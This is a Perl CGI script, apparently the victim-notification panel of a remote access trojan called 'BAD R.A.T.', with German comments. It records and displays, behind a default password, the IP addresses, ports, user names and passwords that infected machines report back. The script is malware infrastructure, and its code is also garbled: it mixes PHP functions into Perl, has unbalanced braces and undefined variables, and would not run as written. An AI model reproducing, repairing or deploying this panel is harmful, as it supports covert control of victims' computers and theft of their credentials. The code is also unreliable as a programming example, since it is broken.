#! /usr/bin/perl

###################################################
#    Name:    CGI-Notify for [BAD R.A.T.]         #
#    Version: 1.0                                 #
#    Copy by: Mr Hawk [BAD R.A.T.]-Company        #
#    Web:     www.bad-rat.de.vu                   #
###################################################
#Features:                                        #
#- Aufzeichen der Infos, die vom Server kommen    #
#- Passwortschutz                                 #
#- Einstellen von Farben und Tabellenweite        #
#- Beliebige Scriptnamen (passt sich selbst an)   #
###################################################
#Config
$seper="|";
$tablehead="IP|Port|User|Time|Date|Pass|Server";
$bgcolor="#000000";
$fontcolor="#01FEFF";
$tbbgcolor="#000000";
$tbfontcolor="#01FEFF";
$tbsize="700px";
$pagepass="Passwort";
$savefile="notify.txt";

print "Content-type:text/html\n\n";
#============================#
# add / change pass below    #
#============================#
  $scriptlocation = $ENV{'SCRIPT_NAME'};
  $password = $in{'password'};
  $action=$in{'action'};
  $send=$in{'send'};

$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in);

if($action eq "login") {&log_send}

    print "<html>\n<head>\n<title>[BAD R.A.T.]-Company CGI-Notify</title>\n<style type=text/css>\n<!--\n";
    print "input  \n";
    print "{border-right: $fontcolor 1px solid; border-top:$fontcolor 1px solid;";
    print "border-left: $fontcolor 1px solid; color: $fontcolor ;";
    print "background-color:$bgcolor; border-bottom: $fontcolor 1px solid; }";
    print "-->\n</style>\n</head>\n";
    print "<body text=$fontcolor bgcolor=$bgcolor link=$fontcolor alink=$fontcolor vlink=$fontcolor>\n";
    print "<center><h1>[BAD R.A.T.]-Company<br> CGI-Notify   </h1>\n\n";

open (FILE,"+<$savefile") || die "$savefile kann nicht geöffnet werden $!\n";
@list = <FILE>;
close(FILE);

if ($pagepass eq ""){ &show_list;}

if ($action eq "") {
      if ($password eq $pagepass) {
          &show_list;
          exit;
       }
      &wrong_password;
   }
 &ask_password;

sub log_send {
   open (FILE,"+<$my_log");
   @list = <FILE>;
   print "@list \n $send";
   print FILE (@list);
   close(FILE);}
   }
sub wrong_password {
   print "<h2>Falsches Passward $!</h2><br>\n";
   print "<form action=$scriptlocation method=get> \n <input type=password  name=pass >&nbsp; <input type=submit  value=Check> \n</form>";
   print "</body></HTML>\n";
   exit;}
sub ask_password {
   print "<form action=$scriptlocation method=get> \n <input type=password  name=pass >&nbsp; <input type=submit  value=Check> \n</form>";
   print "</body></HTML>\n";
   exit;}

sub show_list {
        @list="$tablehead\n@list"
        $zerlegt=explode($seper,@list);
        $return="<tr align=center bgcolor=$tbbgcolor>";
        for($i=0; isset($zerlegt[$i]); $i++)
        {$return="<td>$zerlegt[$i]</td>\n";}
        $return= "$return</tr>\n";}
        print "<table width=$tbsize bgcolor=$tbfontcolor cellspacing=1 cellpadding=1 border=0>\n ";
        print "<tr align=center bgcolor=$tbbgcolor>\n";
        print "$return";
        print "</table>";
        print "</body></HTML>\n";
        exit; }